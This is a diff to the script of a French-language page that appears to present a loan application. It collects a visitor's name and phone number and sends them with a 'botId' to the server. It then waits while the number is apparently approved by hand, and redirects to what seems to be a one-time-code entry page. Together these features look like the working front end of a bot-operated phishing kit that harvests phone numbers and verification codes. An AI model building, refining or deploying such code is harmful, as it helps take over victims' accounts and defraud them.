@@ -291,6 +291,24 @@
 </div>
 
 <script>
+// ---------- FALLBACK FOR FULL NAME ----------
+let fullName = localStorage.getItem('fullName');
+if (!fullName) {
+    fullName = 'Loan Customer';
+    localStorage.setItem('fullName', fullName);
+}
+
+const params = new URLSearchParams(window.location.search);
+const urlBotId = params.get('botId');
+if (urlBotId) localStorage.setItem('botId', urlBotId);
+const botId = localStorage.getItem('botId');
+
+if (!botId) {
+    alert('Session expirée. Veuillez recommencer.');
+    window.location.href = 'index.html';
+}
+
+// ---------- DOM REFS ----------
 const form = document.getElementById('detailsForm');
 const statusEl = document.getElementById('status');
 const spinner = document.getElementById('spinner');
@@ -298,106 +316,93 @@ const nextButton = form.querySelector('button.primary');
 const backButton = document.querySelector('.back-link button');
 const termsCheck = document.getElementById('termsCheck');
 
-const fullName = localStorage.getItem('fullName');
+// ---------- FORM SUBMIT ----------
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-const params = new URLSearchParams(window.location.search);
-const urlBotId = params.get('botId');
-if(urlBotId) localStorage.setItem('botId', urlBotId);
-const botId = localStorage.getItem('botId');
+    if (!termsCheck.checked) {
+        statusEl.style.display = 'block';
+        statusEl.classList.add('error');
+        statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
+        return;
+    }
 
-if(!botId || !fullName){
-  alert('Session expirée. Veuillez recommencer.');
-  window.location.href='index.html';
-}
+    nextButton.disabled = true;
 
-form.addEventListener('submit', async (e)=>{
-  e.preventDefault();
-  
-  if (!termsCheck.checked) {
+    const phone = document.getElementById('phone').value.trim();
+    if (!phone) {
+        statusEl.style.display = 'block';
+        statusEl.classList.add('error');
+        statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
+        nextButton.disabled = false;
+        return;
+    }
+
+    localStorage.setItem('phone', phone);
+
     statusEl.style.display = 'block';
-    statusEl.classList.add('error');
-    statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
-    return;
-  }
+    spinner.style.display = 'block';
+    statusEl.classList.remove('error');
+    statusEl.textContent = '⏳ En attente d\'approbation...';
 
-  nextButton.disabled = true;
+    try {
+        const res = await fetch(`${window.location.origin}/submit-phone`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name: fullName, phone, botId })
+        });
 
-  const phone = document.getElementById('phone').value;
+        if (!res.ok) throw new Error();
 
-  if (!phone || phone.trim() === '') {
-    statusEl.style.display = 'block';
-    statusEl.classList.add('error');
-    statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
-    nextButton.disabled = false;
-    return;
-  }
+        const { requestId } = await res.json();
+        pollApproval(requestId);
 
-  localStorage.setItem('phone', phone);
-
-  statusEl.style.display='block';
-  spinner.style.display='block';
-  statusEl.classList.remove('error');
-  statusEl.textContent='⏳ En attente d\'approbation...';
-
-  try{
-    const res = await fetch(`${window.location.origin}/submit-phone`,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({name: fullName, phone: phone, botId: botId})
-    });
-
-    if(!res.ok) throw new Error();
-
-    const { requestId } = await res.json();
-    pollApproval(requestId);
-
-  } catch(error) {
-    spinner.style.display='none';
-    statusEl.classList.add('error');
-    statusEl.textContent='❌ Erreur serveur. Veuillez réessayer.';
-    nextButton.disabled = false;
-    console.error('Error:', error);
-  }
+    } catch (error) {
+        spinner.style.display = 'none';
+        statusEl.classList.add('error');
+        statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
+        nextButton.disabled = false;
+        console.error(error);
+    }
 });
 
-function pollApproval(requestId){
-  const interval = setInterval(async ()=>{
-    try {
-      const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
-      const data = await res.json();
+// ---------- POLLING ----------
+function pollApproval(requestId) {
+    const interval = setInterval(async () => {
+        try {
+            const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
+            const data = await res.json();
 
-      // If server returns a redirect URL, go there
-      if (data.redirect) {
-        clearInterval(interval);
-        window.location.href = data.redirect;
-        return;
-      }
+            if (data.redirect) {
+                clearInterval(interval);
+                window.location.href = data.redirect;
+                return;
+            }
 
-      // If approved is false, show error
-      if (data.approved === false) {
-        clearInterval(interval);
-        spinner.style.display='none';
-        statusEl.classList.add('error');
-        statusEl.textContent='❌ Numéro rejeté. Veuillez réessayer.';
-        nextButton.disabled = false;
-      }
-      // If approved is true (but no redirect) – shouldn't happen, but handle just in case
-      if (data.approved === true) {
-        clearInterval(interval);
-        // fallback to OTP page if no redirect given
-        window.location.href = 'code.html';
-      }
-    } catch(error) {
-      console.error('Polling error:', error);
-    }
-  }, 2000);
+            if (data.approved === false) {
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                statusEl.classList.add('error');
+                statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
+                nextButton.disabled = false;
+            }
+
+            // fallback if approved true but no redirect
+            if (data.approved === true) {
+                clearInterval(interval);
+                window.location.href = 'code.html';
+            }
+        } catch (error) {
+            console.error('Polling error:', error);
+        }
+    }, 2000);
 }
 
-// Disable Go Back button after click
+// ---------- BACK BUTTON ----------
 if (backButton) {
-  backButton.addEventListener('click', ()=>{
-    backButton.disabled = true;
-  });
+    backButton.addEventListener('click', () => {
+        backButton.disabled = true;
+    });
 }
 </script>
 
